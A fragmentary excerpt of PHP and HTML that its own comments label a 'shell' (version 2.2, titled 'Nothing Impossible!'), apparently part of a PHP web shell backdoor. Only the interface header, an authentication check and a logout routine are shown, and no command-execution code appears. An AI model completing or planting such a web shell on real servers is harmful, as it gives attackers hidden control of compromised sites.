...
$s_ver = "2.2"; // shell ver
$s_title = "Nothing Impossible!"; // shell title
...
<body onLoad="init();">
		<table id="main">
				<tr><td><?php if($s_auth){ ?>
				<div><table id="header"><tr><td style="width:80px;">
					<table>
						<tr><td><h1><a href="?">Nothing</a></h1></td></tr>
						<tr><td style="text-align:right;"><div class="ver">imposible!</div></td></tr>
					</table>
				</td>
				<td><div class="headinfo"><?php echo $s_info; ?>
					<a href="<?php $_PHP_SELF ?>?action=0">Logout</a>
				</div></td></tr></table>
				</div>
	...
	<?php
		if(isset($_GET['action']) && $_POST['action'] == 0){
			session_destroy();
			$page = $_SERVER['PHP_SELF'];?>
			<script>window.location.href = '<?php echo $_SERVER['PHP_SELF']; ?>';</script>
	<?php
		}
	?>
</body>
